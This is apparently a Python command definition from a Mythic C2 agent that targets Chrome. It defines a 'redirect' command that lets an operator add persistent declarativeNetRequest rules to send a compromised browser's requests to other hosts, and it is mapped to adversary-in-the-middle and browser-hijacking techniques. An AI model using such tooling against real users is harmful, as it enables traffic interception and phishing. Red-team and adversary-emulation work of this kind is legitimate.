from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class RedirectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["list", "add", "remove", "clear"],
                default_value="list",
                description="Redirect action",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="from",
                type=ParameterType.String,
                description="Host, URL, or DNR urlFilter to match",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="to",
                type=ParameterType.String,
                description="Destination host or absolute URL",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="mode",
                type=ParameterType.ChooseOne,
                choices=["host", "url"],
                description="host keeps path and query. url replaces the request. Empty infers from to.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="scope",
                type=ParameterType.ChooseOne,
                choices=["document", "all"],
                default_value="document",
                description="document is main_frame and sub_frame. all includes XHR and other types.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
            CommandParameter(
                name="id",
                type=ParameterType.Number,
                description="Rule id for remove",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            self.add_arg("action", "list")
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        pieces = self.command_line.split()
        self.add_arg("action", pieces[0])
        if pieces[0] == "add" and len(pieces) >= 3:
            self.add_arg("from", pieces[1])
            self.add_arg("to", pieces[2])
        if pieces[0] == "remove" and len(pieces) > 1:
            self.add_arg("id", pieces[1])

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class RedirectCommand(CommandBase):
    cmd = "redirect"
    needs_admin = False
    help_cmd = "redirect [list|add|remove|clear]"
    description = "Persist declarativeNetRequest redirect rules. google.com can rewrite to google2.com."
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1557", "T1185"]
    argument_class = RedirectArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        action = taskData.args.get_arg("action") or "list"
        display = action
        if taskData.args.get_arg("from"):
            display += f" {taskData.args.get_arg('from')}"
        if taskData.args.get_arg("to"):
            display += f" -> {taskData.args.get_arg('to')}"
        if taskData.args.get_arg("id") is not None:
            display += f" {taskData.args.get_arg('id')}"
        return wired_tasking(taskData, display)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
